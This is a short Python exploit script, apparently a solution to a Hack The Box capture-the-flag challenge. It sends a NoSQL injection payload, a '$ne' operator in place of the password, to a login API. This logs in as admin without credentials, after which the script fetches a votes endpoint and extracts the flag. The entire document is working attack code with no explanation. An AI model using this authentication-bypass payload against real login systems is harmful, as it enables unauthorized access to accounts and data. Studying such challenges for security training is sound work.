import requests
import sys
import re

if len(sys.argv) != 2:
    print("Usage: python3 exploit.py <ip>")
    sys.exit(1)

session = requests.Session()
url = sys.argv[1]
login_url = f"http://{url}/api/login"
flag_url = f"http://{url}/api/votes/list"
headers = {"Content-Type": "application/json"}

login_data = {
    "username": "admin",
    "password": {"$ne": "asdasd"}
}

r_login = session.post(login_url, json=login_data, headers=headers)
r_flag = session.get(flag_url, headers=headers)

flag = re.search(r"HTB\{.*?\}", r_flag.text)
if flag:
    print(flag.group(0))
